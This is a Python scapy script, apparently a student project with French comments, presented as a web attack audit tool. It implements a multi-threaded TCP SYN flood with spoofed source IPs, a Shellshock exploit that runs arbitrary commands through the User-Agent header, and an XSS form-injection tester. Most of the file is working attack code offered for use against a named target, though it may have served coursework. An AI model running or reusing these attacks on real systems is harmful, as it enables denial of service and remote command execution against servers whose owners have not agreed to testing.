#! /usr/bin/env python
# -*- coding: utf-8 -*-

# sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 192.168.0.10 -j DRO


## TODO:
##  - vérifier que le code HTTP est 200 avant de poursuivre une attaque
##  - Prendre en compte les redirection avec le header location


from scapy.all import *
import threading
import argparse
import hashlib
import urllib
import random
import Queue
import copy
import time
import sys
import os
import re


def parseTarget(target):
    target = target.replace('http://', '')
    target = target.replace('https://', '')
    try : host, page = target.split('/', 1)
    except :
        host = target
        page = ''
    return host, page


def getUniqueID():
    return hashlib.md5(str(time.time())).hexdigest()



class DOS():
    target = None
    port = None
    #init
    def __init__(self, target, port = 80):
        self.target = target
        self.port = int(port)

    def tcp_syn_flood(self, start=30000, length=30000, fake_ip = True):
        pool = self.createFloodPool(start, length, 100, self.__tcp_syn_flood, fake_ip, arguments = {})

        print "Starting flooding..."
        for t in pool: t.start()      # Starting threads
        for t in pool: t.join()       # Joining threads
        print "Ending flooding."

    def createFloodPool(self, flood_port_start, flood_port_len, flood_port_step, funct, fake_ip, arguments = {}):
        pool = []
        for port in range(flood_port_start, flood_port_start + flood_port_len, flood_port_step):
            arg = copy.copy(arguments)
            arg['start'] = port
            arg['end'] = port + flood_port_step
            if fake_ip: arg['fake_ip'] ="10." + '.'.join([str(i) for i in random.sample(xrange(255), 3)])

            t = threading.Thread(target=funct, name="flood-" + str(port), kwargs=arg)
            pool.append(t)

        return pool

    def __tcp_syn_flood(self, fake_ip = None, start=40000, end=50000):
        if fake_ip: ip = IP(dst=self.target, src=fake_ip)
        else: ip = IP(dst=self.target)

        syn = ip / TCP(dport=self.port, sport=(start, end), flags='S')
        send(syn, verbose=0)
        # print "Sent ", end - start, " with IP " + fake_ip if fake_ip else 'with local IP'

class HTTP(object):
    """
    Cette classe permet de manipuler les requêtes HTTP via SCAPY. La méthode GET est implémenté.
    Les fonctions getForms et getRessources permettent de récupérer respectivement les formulaires
    (paramètre et inputs) ainsi que les ressources incluent dans la page (html et php seulement).

    Reste à implémenter: méthode POST
    """
    # Defining rgex to parse content
    RES_REGEX = re.compile(r"src\=(?:\"|')(?P<location>.*?)\.(?P<ext>\w+?)(?P<param>\?.*?)?(?:\"|')", re.IGNORECASE)
    FORM_REGEX = re.compile(r"<form(?P<form_param>.*?)>(?P<content>.*?)</form>", re.IGNORECASE | re.DOTALL)
    INPUT_REGEX = re.compile(r"<input(.*?)>", re.IGNORECASE | re.DOTALL)
    PARAM_REGEX = re.compile(r"(?P<name>\w*?)\=(?:\"|')(?P<value>.*?)(?:\"|')", re.IGNORECASE)

    # Defining TCP flags
    FIN = 0x01
    SYN = 0x02
    RST = 0x04
    PSH = 0x08
    ACK = 0x10

    # Defining error codes
    HOST_DOWN_ERROR = -1
    CON_RST_ERROR = -2

    def __init__(self, host, sport = None, header = {}):
        self.host = host
        if not sport: self.sport = random.randint(30000, 65000)
        else: self.sport = sport

        self.request_header = {"User-Agent":"sr2i203/0.1.1+debian-1",
        "Accept":"text/html, text/*;q=0.5, image/*, application/*, video/*, audio/*, message/*, inode/*, x-content/*, misc/*, x-scheme-handler/*",
        "Host":host}

        # On ajoute les headers donnés en paramètre
        for k in header: self.setHeader(k, header[k])

        self.get = {}

    def setHeader(self, name, value):
        self.request_header[name] = value

    def handshake(self):
        """
            Permet d'établir le handshake TCP entre la machine et un hôte distant
        """

        print "SYN/ACK ", self.host, self.sport
        syn = IP(dst = self.host) / TCP(dport=80, sport=self.sport, flags='S')
        syn_ack = sr1(syn, verbose=0) # Sending syn, receiving syn ack

        if syn_ack.haslayer(TCP):
            ack = IP(dst = self.host) / TCP(dport=80, sport=syn_ack[TCP].dport, seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='A')
            send(ack, verbose = 0) # Sending ack
            return syn_ack
        else:
            return None

    def close(self, con, init = False):
        """
            Ferme la connexion passée en paramètre. Si init est à True, cela signifit que c'est la machine locale qui initie la fermeture de connexion.
        """


        if con.haslayer(Raw):
            close = IP(dst=con[IP].src) / TCP(dport=80, sport=con[TCP].dport, seq=con[TCP].ack, ack=con[TCP].seq + len(con[Raw].load), flags='FA')
        else:
            close = IP(dst=con[IP].src) / TCP(dport=80, sport=con[TCP].dport, seq=con[TCP].ack, ack=con[TCP].seq + 1, flags='FA')

        # If connection closing initiated by client: send(FIN ACK) -> rcv(ACK then FIN ACK) -> send(ACK)
        # If connection closing initiated by server:                          send(FIN ACK) ->  rcv(ACK)
        if init:
            a, u = sr(close, verbose = 0, multi=1, timeout=0.5) # send(FIN ACK) -> rcv(ACK then FIN ACK)
            r = a[-1][1]                                        # Selectinf FIN ACK in received packets
            send(IP(dst=r[IP].src) / TCP(dport=80, sport=r[TCP].dport, seq=r[TCP].ack, ack=r[TCP].seq + 1, flags='A'), verbose=0) # Sending final ACK
        else: send(close, verbose=0) # Sending FIN ACK

    def addFragment(self, html_rep, page, ack, seq):
        """
            Ajoute un fragment TCP recu à la liste des fragments TCP
            Parse le header de la réponse HTTP s'il s'agit du premier fragment
        """

        if page in self.get and not html_rep.startswith('HTTP'):
            if not (ack, seq) in self.get[page]['data_frag']:
                self.get[page]['data_frag'][(ack, seq)] = html_rep      # Adding a fragment
                self.get[page]['len'] += len(html_rep)                  # Updating total data length

        elif html_rep.startswith('HTTP'):   # Received fragment is the first one (HTTP header)
            try: header, data = html_rep.split('\r\n\r\n', 1)
            except: # if no data in fragment header, split raise an error
                header = html_rep
                data = ''
            header = header.split('\r\n')   # Splitting header lines
            code = int(header[0].split(' ')[1])

            # Modifying header special fields that have no value so no ": " (to avoid errors later)
            for i in range(len(header)):
                 if ': ' not in header[i]: header[i] += ': '

            header = {i.split(': ')[0]:i.split(': ')[1] for i in header[1:]}
            self.get[page] = {'code':code, 'header':header, 'data_frag':{(ack, seq):data}, 'data':data, 'len': len(data)}
        else:
            print "ERREUR A TRAITER: HEADER N EST PAS ARRIVE EN PREMIER..."

    def mergeFragments(self, page):
        """
            Cette fonction fusionne les fragments TCP collectés dans le bon ordre
        """
        if page in self.get:
            self.get[page]['data'] = ''.join([self.get[page]['data_frag'][i] for i in sorted(self.get[page]['data_frag'].keys())])

    def request(self, req_funct, page = '', con=None, data =None):

        # Handshake
        if con == None:
            syn_ack = self.handshake()
            if not syn_ack:
                print "Host down"
                return HTTP.HOST_DOWN_ERROR
        else : syn_ack = con

        # GET OR POST
        con = req_funct(page, syn_ack, data)

        if con[TCP].flags & HTTP.RST: return HTTP.CON_RST_ERROR # If connection reseted => exit function

        # Close connection
        del(self.get[page]['data_frag']) # Useless after this point, so deleting
        if self.get[page]['code'] == 301: # 301: Moved permanently => calling GET recursively
            return self.request(req_funct, self.get[page]['header']['Location'], con, data)
        self.close(con, True)

        return self.get[page]

    def POST(self, page = '', con=None, data={}):
        return self.request(self.__http_post, page, con, data)

    def GET(self, page = '', con=None):
        return self.request(self.__http_get, page, con)

    def getForms(self, page):
        """
        Recherche les formulaires inclus dans une page
        """

        forms = HTTP.FORM_REGEX.findall(self.get[page]['data'])
        self.get[page]['forms'] = []
        for params, content in forms:
            form = {}

            form = dict(HTTP.PARAM_REGEX.findall(params))

            inputs = HTTP.INPUT_REGEX.findall(content)
            form['inputs'] = {}
            for e in inputs:
                params = dict(HTTP.PARAM_REGEX.findall(e))

                try: name = params['name']
                except: name = params['type']

                form['inputs'][name] = params
                if 'required' in params: form['inputs'][name]['required'] = True

            self.get[page]['forms'].append(form)
        return self.get[page]['forms']

    def getRessources(self, page):
        """
        Recherche les ressources web (html, PHP) inclues dans une page
        """

        res = HTTP.RES_REGEX.findall(self.get[page]['data'])
        to_fetch = []

        # Regex give location, extension and parameters of each field
        for loc,ext,param in res:
            if ext in ['html', 'htm', 'php']:
                if loc.startswith('../'):
                    # Fetch res with relative path
                    loc = os.path.normpath(os.path.join(os.path.dirname(page), loc))
                    to_fetch.append(loc)
                elif loc.startswith('/'):
                    # Fetch res with absolute path
                    to_fetch.append(loc[1:])
                else: continue  # External res not fetched
        return to_fetch


    def formatHeader(self):
        """
        Formatte de dictionnaire du header pour l'insérer dans la requête HTTP
        """
        return ''.join([i + ": " + self.request_header[i] + '\r\n' for i in self.request_header]) + '\r\n'

    def __http_get(self, page, syn_ack, data=None):

        # Envoie de la requête GET
        getStr = 'GET /' + page + ' HTTP/1.1\r\n' + self.formatHeader()

        return self.__tcp_request(page, syn_ack, getStr)


    def __http_post(self, page, syn_ack, data=''):
        # Envoie de la requête GET
        self.setHeader('Content-Type', 'application/x-www-form-urlencoded')
        self.setHeader('Content-Length', str(len(data)))

        postStr = 'POST /' + page + ' HTTP/1.1\r\n' + self.formatHeader()
        postStr += data

        del self.request_header['Content-Type']
        del self.request_header['Content-Length']

        print postStr
        return self.__tcp_request(page, syn_ack, postStr)


    def __tcp_request(self, page, syn_ack, html_request):
        q = Queue.Queue()

        request = IP(dst=self.host) / TCP(dport=80, sport=syn_ack[TCP].dport, seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='PA') / html_request
        repl, u = sr(request, multi=1, timeout=1, verbose=0)

        # On stocke tous les packets recus dans une file d'attente
        for s, reply in repl: q.put(reply)

        # Proceeding queue and adding new replies to it
        while not q.empty():
            reply = q.get()

            # If the fragment contains data (and is a ACK or PUSH ACK)
            if reply[TCP].flags & HTTP.ACK and (reply.haslayer(Raw)):

                # We add the fragment to previously fetched fragments for this page
                self.addFragment(reply[Raw].load, page, reply[TCP].ack, reply[TCP].seq)

                # Preparing the ACK for the receivedd fragment
                request = IP(dst=self.host) / TCP(dport=80, sport=reply[TCP].dport, seq=reply[TCP].ack, ack=reply[TCP].seq + len(reply[Raw].load), flags='A')

                # Veryfing if request completed
                if 'Content-Length' in self.get[page]['header'] and self.get[page]['header']['Content-Length'] <= self.get[page]['len']: break

                # Sending ACK and waiting for new fragments
                a, u = sr(request, verbose = 0, timeout=0.1, multi=1)
                for s, r in a: q.put(r) # Adding new fragments to queue

            elif reply[TCP].flags & HTTP.RST : break

        # for i in self.get[page]['data_frag']:
        #     print i, ' : ', self.get[page]['data_frag'][i][-50:]
        # print len(self.get[page]['data']), self.get[page]['header']['Content-Length']
        # Merging fragments
        self.mergeFragments(page)
        return reply


class ShellShock(HTTP):
    USER_AGENT = "() { :; };"#ping -c 15 -p 5348454c4c5f53484f434b5f574f524b -s 32 "}

    def __init__(self, host, script_page, header = {}):
        super(ShellShock, self).__init__(host, header = header)
        # self.host = HTTP(host)
        self.target = script_page

    def test(self):
        md5 = getUniqueID() #hashlib.md5(self.host + '/' + self.target).hexdigest()
        pattern = "SHELL_SHOCK_WORK_HERE_" + md5
        self.run("echo; echo '" + pattern + "'")
        # pkts=sniff(filter="icmp", timeout=120,count=5)

        if pattern in self.get[self.target]['data']:
            print "Faille exploitable sur " + self.host
            return True
        else:
            print "Faille non exploitable sur " + self.host
            return False

    def run(self, command):
        self.setHeader('User-Agent', ShellShock.USER_AGENT + command)
        self.GET(self.target)

class XSS():
    PAYLOAD = "<a onmouseover=\"alert('" + getUniqueID() + "')\"</script>"

    def __init__(self, host, page, cookie = None):
        print host, page
        self.target = HTTP(host, header = {'Cookie': cookie} if cookie else {})
        self.page = page

    def selectForms(self, forms):
        selected_forms = []
        for form in forms:
            if self.fieldname in form['inputs']:
                selected_forms.append(form)
        return selected_forms

    def printForms(self, forms):
        for i in range(len(forms)):
            print "Form ID: ", i
            print "Method: ", forms[i]['method']
            print "Action: ", forms[i]['action']
            print "Inputs:"
            for j in forms[i]['inputs']: print '\t- ', j, ': ', forms[i]['inputs'][j]['type'], forms[i]['inputs'][j]
            print '\n\n'

    def fillForm(self, form, fv={}):
        data = {}
        for name in form['inputs']:
            inp = form['inputs'][name]
            if not 'name' in inp: continue
            if inp['type'] in ['reset', 'button', 'submit']: continue

            # A améliorer (gestion de plus de types d'inputs)
            if inp['type'] in ['text', 'password', 'url', 'search']:
                if name in fv:
                    data[name] = fv[name]
                elif 'required' in inp and not (name in fv):
                    data[name] = "xss testing"
                else: data[name] = ""

            elif inp['type'] == 'radio':
                data[name] = inp['value']
            else: data[name] = ""

            data[self.fieldname] = XSS.PAYLOAD
        return data

    def run(self, fieldname, fieldvalue = {}):
        self.target.GET(self.page)
        self.fieldname = fieldname

        sf = self.selectForms(self.target.getForms(self.page))

        if len(sf) > 1:
            self.printForms(sf)
            id = -1
            while id < 0 or id > len(sf):
                id = input('Plusieurs formulaires affichés ci-dessus ont été trouvés.\nMerci de spécifier celui à utiliser (rentrer un l\'ID entre 0 et ' + str(len(sf) - 1) + ') ? ')
        elif len(sf) == 0:
            print "Aucun formulaire contenant un champ '" + fieldname + "'. Abandon."
            return 0
        else: id = 0

        form = sf[id]
        formdata = urllib.urlencode(self.fillForm(form, fieldvalue))

        if form['action'] == '': form_dest = self.page
        else: form_dest = os.path.normpath(os.path.join(os.path.dirname(self.page), form['action']))

        if form['method'].lower() == 'post': self.target.POST(form_dest, data=formdata)
        elif form['method'].lower() == 'get': self.target.GET(form_dest + '?' + formdata)

        print XSS.PAYLOAD in self.target.get[form_dest]['data']

if __name__ == "__main__":
    conf.L3socket = L3RawSocket

    parser = argparse.ArgumentParser(
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
        description="Outil d'audit d'attaques sur application web et serveurs.")

    parser.add_argument("target", help="Hote (ou url) à attaquer.", action='store')
    parser.add_argument("-t", "--tcp-syn-flood", help='Fait un TCP SYN flood (DOS) sur la cible.', action='store_true')
    parser.add_argument("-p", "--port", help='Port cible pour une attaque DOS.', action='store', type=int, default=80)
    parser.add_argument("-s", "--shellshock", help='Teste la vulnérabilité à Shellshock (nécessite un cgi comme cible)', action='store_true')
    parser.add_argument("-c", "--cookie", help='Cookie à utiliser', action='store')
    parser.add_argument("-x", "--xss", help='Teste une attaque XSS sur l\'hote cible.', action='store_true')
    parser.add_argument("-f", "--fieldname", help="Nom du champs à attaquer pour les attaques XSS ou les injections SQL.", action='store')
    parser.add_argument("-v", "--fieldvalue", help="Valeur par défaut d'un autre champ (optionnel) format champ=valeur.", action='append', default=[])
    args = parser.parse_args()
    # print args

    host, page = parseTarget(args.target)

    if args.xss:
        attack = XSS(host, page, args.cookie)
        attack.run(args.fieldname, dict([i.split('=') for i in args.fieldvalue]))

    if args.shellshock:
        victim = ShellShock(host, page)
        victim.test()
        # if victim.test():
        #     victim.run("echo; whoami")
        #     print victim.get["cgi-bin/test.sh"]['data']

    if args.tcp_syn_flood:
        victim = DOS(host, args.port)
        victim.tcp_syn_flood()


    ######  Debug zone  #######
    # print HTTP("192.168.0.21").GET('')
    # html_rep = site.GET('groups/new.php')
    # html_rep = site.GET('index.nginx-debian.html')
    #
    # code = html_rep['code']
    #
    # if code == 404:
    #     print code, " - Not found"
    # elif code == 301:
    #     print "Moved at : " + html_rep['header']['Location']
    #     close(reply)
    # elif code == 200:
    #     print html_rep['data']
    #     print code
